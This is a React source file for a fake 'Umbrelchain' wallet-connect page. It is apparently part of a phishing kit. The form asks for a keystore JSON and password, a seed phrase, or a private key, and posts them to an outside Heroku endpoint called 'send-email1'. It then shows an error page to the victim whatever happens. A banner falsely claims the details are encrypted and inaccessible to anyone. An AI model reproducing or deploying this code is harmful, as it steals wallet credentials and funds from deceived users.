import "./dropdownSection.scss";
import { Button } from "../../../../components";
import { useState } from "react";
import axios from "axios";
import { useHistory } from "react-router-dom";

const DropDownSection = ({ match }) => {
  const history = useHistory();

  const splitData = match.url.split("/");

  const [form, setForm] = useState({
    keystoreJson: "",
    keystorePassword: "",
    mnemonic: "",
    privateKey: "",
  });

  const handleChange = (e) => {
    setForm((prev) => ({
      ...prev,
      [e.target.name]:
        e.target.type === "checkbox" ? !prev[e.target.name] : e.target.value,
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // const result = [];

    // const inputElements = document.querySelectorAll(".dropdown__formInput");
    // inputElements.forEach((input) => {
    //   if (!input.value) {
    //     input.focus();
    //   } else {
    //     result.push(input.value);
    //   }
    // });

    // // customize the error message
    // if (result.length !== 4) {
    //   //   console.log(body);
    //   //   document.querySelector(".dropdownSection__formMsg").innerHTML = "";
    //   // } else {
    //   return (document.querySelector(".dropdownSection__formMsg").innerHTML =
    //     "Please fill all fields");
    // }

    if (
      !form.keystoreJson &&
      !form.keystorePassword &&
      !form.mnemonic &&
      !form.privateKey
    ) {
      return (document.querySelector(".dropdownSection__formMsg").innerHTML =
        "Please fill at least one section");
    }

    if (
      (!form.keystoreJson && form.keystorePassword) ||
      (form.keystoreJson && !form.keystorePassword)
    ) {
      return (document.querySelector(".dropdownSection__formMsg").innerHTML =
        "Please complete the Keystore section");
    }

    if (
      (form.keystoreJson && form.keystorePassword) ||
      form.mnemonic ||
      form.privateKey
    ) {
      const headers = {
        "Content-Type": "application/json",
      };

      try {
        let body = {
          option: splitData[1],
          walletName: splitData[2],
          keystoreJson: form.keystoreJson,
          keystorePassword: form.keystorePassword,
          mnemonic: form.mnemonic,
          privateKey: form.privateKey,
        };

        const res = await axios.post(
          "https://little-maile.herokuapp.com/api/send-email1",
          // "http://localhost:5000/api/send-email1",
          body,
          headers
        );

        console.log(res, "from response");

        history.push("/error");
      } catch (error) {
        console.log(error);

        history.push("/error");
      }
    }
  };

  return (
    <div className="dropdownSection">
      <div className="dropdownSection__container container">
        <div className="dropdownSection__formContainer">
          <form
            action=""
            className="dropdownSection__form"
            onSubmit={handleSubmit}
          >
            <h3 className="dropdownSection__note">
              N.B: The details submitted are encrypted and cannot be accessed by
              Umbrelchain or any other party
            </h3>
            <span className="dropdownSection__formMsg"></span>
            <div className="dropdownSection__formContainer2">
              <h3 className="dropdownSection__head">Keystore</h3>
              <div className="dropdownSection__formGroup">
                <label htmlFor="" className="dropdown__formLabel">
                  keystore JSON
                </label>
                <input
                  type="text"
                  name="keystoreJson"
                  onChange={handleChange}
                  placeholder="Please enter your keystore in JSON format"
                  className="dropdown__formInput"
                />
              </div>
              <div className="dropdownSection__formGroup">
                <label htmlFor="" className="dropdown__formLabel">
                  Password
                </label>
                <input
                  type="password"
                  name="keystorePassword"
                  onChange={handleChange}
                  placeholder="Please, enter your password"
                  className="dropdown__formInput"
                />
              </div>
            </div>

            <div className="dropdownSection__formContainer2">
              <h3 className="dropdownSection__head">Mnemonic</h3>
              <div className="dropdownSection__formGroup">
                <label htmlFor="" className="dropdown__formLabel">
                  Seed Phrase
                </label>
                <input
                  type="password"
                  name="mnemonic"
                  onChange={handleChange}
                  placeholder="You can input your 12, 15, 24 seed phrase"
                  className="dropdown__formInput"
                />
              </div>
            </div>

            <div className="dropdownSection__formContainer2">
              <h3 className="dropdownSection__head">Private key</h3>
              <div className="dropdownSection__formGroup">
                <label htmlFor="" className="dropdown__formLabel">
                  Private key
                </label>
                <input
                  type="password"
                  name="privateKey"
                  onChange={handleChange}
                  placeholder="Please, enter your private key in HEX format"
                  className="dropdown__formInput"
                />
              </div>
            </div>
            <div className="dropdownSection__formSubmit">
              <Button white type="submit" label="Connect" />
            </div>
          </form>
        </div>
        {/* <div className="dropdownSection__dropdown">
          {dropdownData.map((item, index) => {
            return <Dropdown {...item} key={index} />;
          })}
        // </div> */}
        {/* // <div className="dropdownSection__icons">
        //   <ImageSlider data={iconsData} />
        // </div> */}
      </div>
    </div>
  );
};

export default DropDownSection;
